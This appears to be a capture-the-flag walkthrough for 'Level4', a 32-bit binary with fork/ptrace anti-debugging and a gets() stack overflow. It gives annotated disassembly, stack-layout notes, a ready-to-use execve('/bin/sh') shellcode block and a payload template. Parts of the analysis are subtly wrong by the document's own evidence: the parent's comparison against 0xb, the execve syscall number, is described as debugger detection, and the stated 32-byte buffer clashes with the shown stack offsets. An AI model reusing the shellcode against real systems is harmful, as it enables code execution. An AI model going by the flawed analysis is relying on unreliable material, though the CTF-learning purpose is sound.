# Level4 - Anti-Debugging Challenge Walkthrough

## Overview
Level4 implements **anti-debugging protection** using `fork()`, `ptrace()`, and process monitoring. The program creates a child process that sets up debugging protection, while the parent monitors for debugging attempts. However, it contains a **buffer overflow vulnerability** in the `gets()` function that can be exploited with shellcode.

## Key Assembly Analysis

### Main Function Structure
```assembly
0x080486d6 <+14>:    call   0x8048550 <fork@plt>          # fork() - Create child process
0x080486db <+19>:    mov    %eax,0xac(%esp)               # Store child PID
0x080486e2 <+26>:    lea    0x20(%esp),%ebx               # Load buffer address
0x080486f4 <+44>:    rep stos %eax,%es:(%edi)             # Initialize buffer with zeros
0x08048709 <+65>:    cmpl   $0x0,0xac(%esp)               # Check if child process
0x08048711 <+73>:    jne    0x8048769 <main+161>          # Jump to parent code
```

### Child Process (Anti-Debugging Setup)
```assembly
0x08048722 <+90>:    call   0x8048540 <prctl@plt>         # prctl(PR_SET_DUMPABLE, 1)
0x08048746 <+126>:   call   0x8048570 <ptrace@plt>        # ptrace(PTRACE_TRACEME, 0, 0, 0)
0x08048752 <+138>:   call   0x8048500 <puts@plt>          # puts("Give me some shellcode, k")
0x0804875e <+150>:   call   0x80484b0 <gets@plt>          # gets(buffer) - VULNERABLE!
```

### Parent Process (Debugger Detection)
```assembly
0x08048770 <+168>:   call   0x80484f0 <wait@plt>          # wait(&wait_status)
0x080487dc <+276>:   call   0x8048570 <ptrace@plt>        # ptrace(PTRACE_PEEKDATA, child_pid, 0x2c, 0)
0x080487e8 <+288>:   cmpl   $0xb,0xa8(%esp)               # Check if ptrace returned 0xb
0x080487f0 <+296>:   jne    0x8048768 <main+160>          # Loop if debugger detected
```

## Anti-Debugging Mechanisms

### 1. Fork Protection
- **Purpose**: Separate user input handling from monitoring
- **Implementation**: `fork()` creates child process
- **Effect**: Parent can monitor child without interference

### 2. Ptrace Protection
- **Purpose**: Prevent multiple debuggers from attaching
- **Implementation**: `ptrace(PTRACE_TRACEME, 0, 0, 0)` in child
- **Effect**: Only one debugger can attach to child process

### 3. Debugger Detection
- **Purpose**: Detect if external debugger is attached
- **Implementation**: Parent tries `ptrace(PTRACE_PEEKDATA)` on child
- **Logic**: If debugger attached, ptrace fails (returns -1)

### 4. Process Monitoring
- **Purpose**: Monitor child process status
- **Implementation**: `wait()` and status checking
- **Effect**: Detect if child was killed or stopped

## Vulnerability Analysis

### Buffer Overflow in gets()
```c
char buffer[32];  // 32-byte buffer on stack
gets(buffer);     // No bounds checking - VULNERABLE!
```

**Issues:**
- `gets()` has no bounds checking
- Can overflow buffer and overwrite return address
- Stack-based buffer overflow vulnerability

### Stack Layout
```
High Address
+------------------+
| Return Address   | <- Target for overflow
+------------------+
| Saved EBP        |
+------------------+
| Local Variables  |
+------------------+
| buffer[32]       | <- 32-byte buffer
+------------------+
Low Address
```

## Exploitation Strategy

### Step 1: Understand the Protection
- Anti-debugging prevents traditional debugging
- Must use shellcode injection instead
- Buffer overflow bypasses ptrace protection

### Step 2: Calculate Buffer Offset
- Buffer size: 32 bytes
- Need to find exact offset to return address
- Use pattern generation to find offset

### Step 3: Create Shellcode
```python
# Basic shellcode for /bin/sh
shellcode = (
    "\x31\xc0"              # xor eax, eax
    "\x50"                  # push eax
    "\x68\x2f\x2f\x73\x68"  # push "//sh"
    "\x68\x2f\x62\x69\x6e"  # push "/bin"
    "\x89\xe3"              # mov ebx, esp
    "\x50"                  # push eax
    "\x53"                  # push ebx
    "\x89\xe1"              # mov ecx, esp
    "\xb0\x0b"              # mov al, 11
    "\xcd\x80"              # int 0x80
)
```

### Step 4: Build Exploit
```python
# Exploit structure
payload = shellcode + "A" * (offset - len(shellcode)) + return_address
```

## Testing Commands

```bash
# Run the program
./level04

# Expected output
Give me some shellcode, k

# Send exploit payload
python -c "print('shellcode + padding + return_address')" | ./level04
```

## Expected Results

1. **Normal execution**: Program waits for input
2. **With debugger**: Infinite loop or "child is exiting..."
3. **With shellcode**: Shell access in child process
4. **Success**: `$` prompt from shell

## Key Points

- **Anti-debugging**: Uses ptrace and process monitoring
- **Vulnerability**: Buffer overflow in gets() function
- **Exploitation**: Shellcode injection via buffer overflow
- **Protection bypass**: Direct code execution in child process
- **Stack layout**: 32-byte buffer with return address overwrite
- **System calls**: fork(), ptrace(), wait(), gets(), kill()

## Exploitation Steps

1. **Analyze the assembly** to understand anti-debugging
2. **Identify the vulnerability** in gets() function
3. **Calculate buffer offset** to return address
4. **Create shellcode** for /bin/sh execution
5. **Build exploit payload** with proper structure
6. **Test the exploit** to get shell access

The challenge requires **bypassing anti-debugging protection** through **buffer overflow exploitation** rather than traditional debugging techniques.

